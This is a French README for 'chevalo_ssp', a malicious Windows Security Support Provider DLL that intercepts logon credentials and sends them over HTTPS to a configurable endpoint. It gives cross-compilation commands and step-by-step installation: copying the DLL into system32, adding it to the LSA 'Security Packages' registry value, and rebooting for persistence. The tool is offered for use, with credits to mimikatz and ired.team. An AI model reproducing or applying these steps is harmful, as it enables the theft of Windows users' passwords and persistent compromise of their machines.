# evilssp
# TL;DR

gros copier coller de 

https://github.com/gentilkiwi

et 

https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package

# kekesé

Chat GPT

> SSP est l'abréviation de Security Support Provider (Fournisseur de support de sécurité). Dans le contexte de Windows, il s'agit d'un composant logiciel qui permet de gérer l'authentification et la sécurité des connexions réseau. Les SSP sont utilisés par les services d'authentification de Windows pour négocier les protocoles d'authentification avec les clients et les serveurs. Ils sont utilisés pour des connexions telles que les connexions de bureau à distance (RDP), les partages de fichiers et les services Web. Les exemples de SSP dans Windows incluent NTLM, Kerberos et Schannel.


chevalo_ssp est donc un ssp malveillant qui récupére les identifiants de connexion et les envois en https sur un endpoint choisie.

# Configuration

il est possible de modifier:
* URL
* User-Agent

# Compilation

```sh
mkdir -p build && cd build
CC=x86_64-w64-mingw32-gcc cmake ..
make -j 8
```

# injection

## injection via winapi

google

## injection via clef de registre

### step1

copier la dll dans system32.
```
copy ssp.dll %systemroot%\system32\chevalo.dll
```

### step2

recupération de la clef de registre.

```
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
```


### step3

modification de la clef de registre.

Example volé a ired.team

```
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0chevalo.dll" /t REG_MULTI_SZ /f
```

### step4

redémarrer la machine.
```
reboot
```